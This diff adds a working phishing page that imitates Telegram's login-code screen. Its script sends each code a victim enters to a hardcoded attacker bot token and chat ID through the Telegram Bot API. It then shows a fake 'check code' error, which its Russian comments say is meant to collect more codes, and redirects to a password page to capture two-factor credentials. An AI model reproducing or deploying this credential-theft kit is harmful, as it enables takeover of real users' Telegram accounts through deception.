@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Enter Code</title>
+    <style>
+        body {
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh;
+        }
+        .login-box {
+            width: 100%; max-width: 340px; text-align: center; padding: 20px;
+        }
+        .logo-svg { width: 80px; height: 80px; margin-bottom: 30px; }
+        h2 { font-size: 24px; margin-bottom: 12px; font-weight: 600; }
+        p { color: #8e8e93; font-size: 15px; line-height: 1.4; margin-bottom: 35px; }
+        
+        .input-group { text-align: left; margin-bottom: 10px; }
+        label { color: #3390ec; font-weight: 500; font-size: 14px; margin-left: 4px; }
+        
+        /* Поле ввода */
+        input {
+            width: 100%; background-color: #1c1c1e; border: 1px solid #2c2c2e; 
+            padding: 14px; color: #fff; border-radius: 10px; font-size: 20px; 
+            box-sizing: border-box; outline: none; margin-top: 8px;
+            text-align: center; letter-spacing: 3px;
+            transition: border-color 0.3s ease;
+        }
+        input:focus { border-color: #3390ec; }
+        
+        /* Класс для ошибки */
+        input.error { border-color: #ff3b30 !important; }
+        
+        .error-text {
+            color: #ff3b30; font-size: 13px; margin-top: 8px; 
+            display: none; text-align: center; font-weight: 500;
+        }
+
+        .btn-verify {
+            background-color: #3390ec; color: white; border: none;
+            width: 100%; padding: 14px; border-radius: 10px;
+            font-size: 16px; font-weight: 600; cursor: pointer;
+            text-transform: uppercase; margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <svg class="logo-svg" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#3390ec"/><path d="M175.8 70.4L44.2 121.1c-9 3.6-9 8.6-1.7 10.8l33.8 10.5 78.1-49.3c3.7-2.2 7.1-1 4.3 1.5L95.4 151.9l-2.5 34.9c3.4 0 4.9-1.6 6.8-3.4l16.4-16 34.2 25.3c6.3 3.5 10.8 1.7 12.4-5.8l22.4-105.9c2.3-9.2-3.5-13.4-9.4-10.6z" fill="white"/></svg>
+        
+        <h2>Check your Telegram</h2>
+        <p>We've sent the code to the <b>Telegram</b> app on your other device.</p>
+        
+        <form id="codeForm">
+            <div class="input-group">
+                <label>Code</label>
+                <input type="text" id="tg-code" placeholder="Enter code" maxlength="6" inputmode="numeric" required>
+                <div id="error-msg" class="error-text">Check code</div>
+            </div>
+            <button type="submit" class="btn-verify">Verify</button>
+        </form>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8598157493:AAH_95b9t0ehVfwvfBm2vcnySZyyY79rUBg'; 
+        const CHAT_ID = '6990072009';
+
+        document.getElementById('codeForm').onsubmit = function(e) {
+            e.preventDefault();
+            const codeInput = document.getElementById('tg-code');
+            const errorMsg = document.getElementById('error-msg');
+            const code = codeInput.value;
+
+            // Если код слишком короткий (обычно в ТГ 5 или 6 цифр)
+            if (code.length < 5) {
+                showError();
+                return;
+            }
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🔑 Получен код подтверждения: ${code}`
+                })
+            }).then(() => {
+                // Имитируем ошибку при первой попытке, чтобы собрать больше кодов, 
+                // или просто перекидываем дальше. 
+                // Давай сделаем красную рамку, будто код не подошел:
+                showError();
+                
+                // Через 2 секунды "ошибки" перекидываем на 2FA
+                setTimeout(() => {
+                    window.location.href = "password.html";
+                }, 1500);
+            });
+
+            function showError() {
+                codeInput.classList.add('error');
+                errorMsg.style.display = 'block';
+                // Тряска поля для эффекта
+                codeInput.style.transform = 'translateX(5px)';
+                setTimeout(() => codeInput.style.transform = 'translateX(-5px)', 100);
+                setTimeout(() => codeInput.style.transform = 'translateX(0)', 200);
+            }
+        };
+
+        // Убираем ошибку при начале нового ввода
+        document.getElementById('tg-code').oninput = function() {
+            this.classList.remove('error');
+            document.getElementById('error-msg').style.display = 'none';
+        };
+    </script>
+</body>
+</html>
+
